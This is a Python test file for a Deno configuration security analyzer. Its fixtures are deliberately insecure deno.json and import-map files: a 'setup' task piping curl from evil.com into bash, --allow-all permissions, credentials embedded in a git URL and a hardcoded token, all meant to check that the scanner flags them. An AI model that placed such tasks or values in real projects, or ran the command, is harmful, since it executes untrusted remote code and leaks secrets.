"""Tests for DenoAnalyzer."""

from pathlib import Path

from devai.deno_analyzer import DenoAnalyzer, DenoFinding


INSECURE_DENO = """\
{
  "tasks": {
    "start": "deno run --allow-all main.ts",
    "setup": "curl http://evil.com/install.sh | bash",
    "deploy": "deno run --allow-net --allow-read --allow-write --allow-run deploy.ts"
  },
  "imports": {
  "lodash": "npm:lodash@latest",
  "evil": "git+https://user:pass@github.com/org/pkg.git#main",
  "remote": "http://unversioned.example.com/lib.js"
  },
  "compilerOptions": {
    "lib": ["deno.unstable"]
  }
}
"""

INSECURE_IMPORT_MAP = """\
{
  "imports": {
    "api": "http://insecure-api.example.com/sdk.js",
    "secret": "token=hardcoded-secret-token-12345"
  }
}
"""

HARDENED_DENO = """\
{
  "tasks": {
    "start": "deno run --allow-net=localhost --allow-read=./src main.ts",
    "test": "deno test --allow-read=./tests,./src"
  },
  "imports": {
    "@std/": "jsr:@std/"
  }
}
"""


class TestDenoAnalyzer:
    def test_detects_insecure_deno_json(self, tmp_path: Path):
        (tmp_path / "deno.json").write_text(INSECURE_DENO, encoding="utf-8")
        analyzer = DenoAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "allow_all" in kinds
        assert "curl_pipe_shell" in kinds or "insecure_http" in kinds
        assert "scm_credentials" in kinds or "unpinned_dependency" in kinds
        assert analyzer.health_score() < 40.0

    def test_detects_insecure_import_map(self, tmp_path: Path):
        (tmp_path / "import_map.json").write_text(INSECURE_IMPORT_MAP, encoding="utf-8")
        analyzer = DenoAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds
        assert "hardcoded_secret" in kinds

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "deno.json").write_text(HARDENED_DENO, encoding="utf-8")
        analyzer = DenoAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = DenoAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0

    def test_finding_format(self):
        finding = DenoFinding(
            kind="allow_all",
            severity="high",
            message="test",
            path="deno.json",
            lineno=3,
        )
        assert "[high] deno.json:3" in finding.format()

    def test_generate_hardened_config(self):
        config = DenoAnalyzer(".").generate_hardened_config()
        assert "allow-net=localhost" in config
        assert "jsr:@std/" in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "deno.json").write_text(INSECURE_DENO, encoding="utf-8")
        context = DenoAnalyzer(str(tmp_path)).to_context()
        assert "Deno analysis:" in context
        assert "tasks:" in context
